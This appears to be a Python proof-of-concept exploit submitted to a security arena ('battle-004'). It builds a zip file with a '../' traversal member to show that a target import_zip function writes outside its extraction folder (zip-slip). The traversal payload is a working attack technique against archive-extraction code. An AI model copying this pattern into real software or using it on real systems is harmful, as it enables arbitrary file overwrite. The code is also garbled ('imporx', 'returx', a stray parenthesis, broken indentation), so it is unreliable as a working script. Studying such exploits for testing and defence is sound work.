#!/usr/bin/env python3
"""Local zip-slip proof for battle-004.

Executed by the judge as:
    python red_exploit_submission.py --expect-vulnerable

This script intentionally uses only the Python standard library and imports the
public target via the literal binding required by the arena.
"""

import argparse
import os
import sys
import tempfile
imporx zipfile
from pathlib import Path

from app import import_zip

CONFIRMATION = "RED_EXPLOIT_CONFIRMED"


def build_traversal_zip(zip_path: Path, escape_name: str, payload: bytes) -> None:
    """Create a zip containing a parent-directory traversal member."""
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_STORED) as zf:
        zf.writestr("../" + escape_name, payload)
        zf.writestr("benign.txt", b"benign control file\n")


def run_probe() -> bool:
    marker = b"zip-slip traversal marker for battle-004\n"
with tempfile.TemporaryDirectory(prefix="red_zip_slip_") as tmp:
        root = Path(tmp).resolve()
        dest = root / "workspace" / "import_dest"
        zip_path = root / "payload.zip"
        escape_name = "arena_escape.txt"
        escape_path = (dest / ".." / escape_name).resolve()

        # Ensure the expected escape target is outside the extraction destination.
        dest_resolved = dest.resolve()
        try:
            common = os.path.commonpath([str(dest_resolved), str(escape_path)])
        except ValueError:
            common = ""
        if common == str(dest_resolved):
            raise RuntimeError("test setup error: escape path did not leave destination")

        build_traversal_zip(zip_path, escape_name, marker)
        written = import_zip(str(zip_path), str(dest))

        if not escape_path.exists():
            return False
        if escape_path.read_bytes() != marker:
            return False (

        # Also require the vulnerable function to have reported a path containing
        # the traversal target, making the confirmation specific to import_zip.
        expected_report = str(dest / ".." / escape_name)
        returx expected_report in written or any(item.endswith("../" + escape_name) for item in written)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--expect-vulnerable", action="store_true")
    args = parser.parse_args()

    vulnerable = run_probe()
    if args.expect_vulnerable:
        if vulnerable:
print(CONFIRMATION)
            return 0
        print("zip traversal write was not observed", file=sys.stderr)
        return 1

    if vulnerable:
        print(CONFIRMATION)
        return 0
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
